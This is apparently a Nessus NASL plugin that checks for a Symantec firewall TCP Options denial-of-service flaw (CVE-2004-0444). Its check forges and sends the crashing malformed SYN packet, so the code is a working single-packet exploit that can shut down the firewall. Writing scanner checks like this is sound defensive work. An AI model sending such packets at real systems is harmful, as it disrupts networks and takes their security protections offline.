#
# (C) Tenable Network Security
#
if(description)
{
  script_id(12216);
  script_bugtraq_id(10204, 10334, 10335);
  script_cve_id ( "CVE-2004-0444" );
  script_version("$Revision: 1.5 $");
  script_name(english:"Symantec Firewall TCP Options DoS");
  if(defined_func("script_xref"))script_xref(name:"IAVA", value:"2004-A-0010");
  script_description(english:"
The remote system appears vulnerable to an invalid Options field
within a TCP packet.  At least one vendor firewall (Symantec) has
been reported prone to such a bug.  An attacker, utilizing this flaw,
would be able to remotely shut down the remote firewall (stopping all
network-based transactions) by sending a single packet to any port.

See also : 
http://www.osvdb.org/displayvuln.php?osvdb_id=5596
http://www.eeye.com/html/Research/Advisories/AD20040423.html

Risk factor : High");
  script_summary(english:"Check for TCP options bug on the remote host");
  script_category(ACT_KILL_HOST);
  script_family(english:"Denial of Service");
  script_copyright(english:"This script is (C) 2004 Tenable Network Security");
  exit(0);
}






#
# The script code starts here


# get an open port and name it port
port = get_host_open_port();
if (!port) exit(0); 
soc = open_sock_tcp(port);
if ( ! soc ) exit(0);
rport = (rand() % 50000) + 1024;
dstaddr=get_host_ip();
srcaddr=this_host();


# goofy packet which looks like:
# Sample Packet (as reported by eeye): 
# 40 00 57 4B 00 00 01 01 05 00
# |___| |___| |___| |_________|
#   |     |     |        |
#  |     |     |    TCP Options
#  |     |  Urgent Pointer
#  |  Checksum
# Window Size
 

ip2 = forge_ip_packet(   ip_v : 4,
                        ip_hl : 5,
                        ip_tos : 0,
                        ip_len : 20,
                        ip_id : 0xABA,
                        ip_p : IPPROTO_TCP,
                        ip_ttl : 255,
                        ip_off : 0,
                        ip_src : srcaddr);

tcpip = forge_tcp_packet(    ip       : ip2,
                             th_sport : rport,
                             th_dport : rport,
                             th_flags : TH_SYN,
                             th_seq   : 0xABBA,
                             th_ack   : 0,
                             th_x2    : 0,
                             th_off   : 6,
                             th_win   : 512,
                             th_urp   : 0,
                             data     : raw_string(0x01,0x01,0x05,0x00) );

result = send_packet(tcpip,pcap_active:FALSE);

sleep(1);                                   

soc = open_sock_tcp(port);
if ( ! soc ){
	security_hole(port);
	set_kb_item(name:"Host/dead", value:TRUE);
	}

